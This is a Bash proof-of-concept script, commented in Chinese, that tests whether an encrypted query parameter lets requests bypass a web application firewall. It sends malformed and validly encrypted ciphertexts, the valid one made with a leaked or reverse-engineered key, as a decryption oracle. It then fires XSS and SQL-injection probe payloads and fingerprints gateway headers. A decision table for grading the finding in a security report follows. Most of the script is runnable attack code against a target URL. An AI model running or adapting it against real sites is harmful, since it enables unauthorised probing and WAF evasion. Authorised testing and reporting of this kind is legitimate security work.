#!/usr/bin/env bash
# 判定「加密参数通道是否绕过 WAF」四步对照实验
# 用法: ./poc.sh <TARGET_URL> [ENDPOINT] [ENC_CMD]
set -u
# ---- 参数检查 ----
if [ $# -lt 1 ]; then printf '用法: ./poc.sh <TARGET_URL> [ENDPOINT] [ENC_CMD]\n  例: ./poc.sh https://example.com /papi/search "python3 ./enc.py enc"\n' >&2; exit 1; fi
TARGET="${1%/}"
EP="${2:-/papi/client/popular-search}"
ENC_FN="${3:-python3 ./encrypt_query_forge.py enc}"   # 你的加密函数：接收明文 JSON，输出 URL 编码后的密文

echo "===== 步骤 0：确认接口存在（无参） ====="
curl -sk -o /dev/null -w 'no-param  HTTP=%{http_code} SIZE=%{size_download}\n' "$TARGET$EP"

echo "===== 步骤 2：密文有效性 oracle ====="
# 坏密文：结构合法（16 字节对齐、base64）但 padding 错误 → 解密必失败
BAD='AAAAAAAAAAAAAAAAAAAAAA%3D%3D'
# 合法密文：用泄露/逆向得到的 key 加密空对象
GOOD=$($ENC_FN '{}')
echo "--- 坏密文（期望 500 / 解密异常）---"
curl -sk -o /tmp/bad.html -w 'HTTP=%{http_code} SIZE=%{size_download}\n' \
  "$TARGET$EP?encrypt_query=$BAD"
grep -oE '<title>[^<]*</title>' /tmp/bad.html | head -1
echo "--- 合法密文（期望 302 或正常业务响应）---"
curl -sk -o /tmp/good.html -D /tmp/good.hdr -w 'HTTP=%{http_code} SIZE=%{size_download}\n' \
  "$TARGET$EP?encrypt_query=$GOOD"
grep -iE '^(location|server)' /tmp/good.hdr

echo "===== 步骤 3：WAF 到底存不存在 ====="
# 明文攻击特征载荷；无副作用，只发一次。若返回业务响应/登录跳转 = 没有 WAF
S=$(python3 -c "import urllib.parse;print(urllib.parse.quote('<script>alert(1)</script>',safe=''))")
Q=$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"a' AND '1'='1\",safe=''))")
curl -sk -D /tmp/w1.hdr -o /tmp/w1.txt -w 'XSS-probe  HTTP=%{http_code} SIZE=%{size_download}\n' \
  "$TARGET$EP?keyword=$S"
curl -sk -o /tmp/w2.txt -w 'SQLi-probe HTTP=%{http_code} SIZE=%{size_download}\n' \
  "$TARGET$EP?keyword=$Q"
echo "--- 响应头（找网关标识：X-WAF-UUID / Server: stgw / EdgeOne / 阿里云 errors.aliyun.com）---"
grep -iE '^(server|x-waf|via|x-cache)' /tmp/w1.hdr
echo "--- 响应体前 100 字（若为拦截文案则 WAF 存在）---"
head -c 100 /tmp/w1.txt; echo

cat <<'NOTE'
===== 判据表 =====
步骤2 坏密文 500 & 合法密文 302/业务  → 服务端确实解密；若 302 为登录跳转 ⇒ 解密先于鉴权（可写进报告）
步骤2 两者响应完全相同              → 接口不读该参数，整条路径作废，不要硬凑
步骤3 出现拦截页/网关头            → WAF 存在，可以继续测「绕过」
步骤3 返回业务响应且无网关头        → WAF 不存在 ⇒ 「加密绕过 WAF」不成立，降回「密钥泄露」本身定级
步骤4 同批资产里必须找到有 WAF 的主机做对照，否则无法排除本机代理/TUN 造成的假象
NOTE
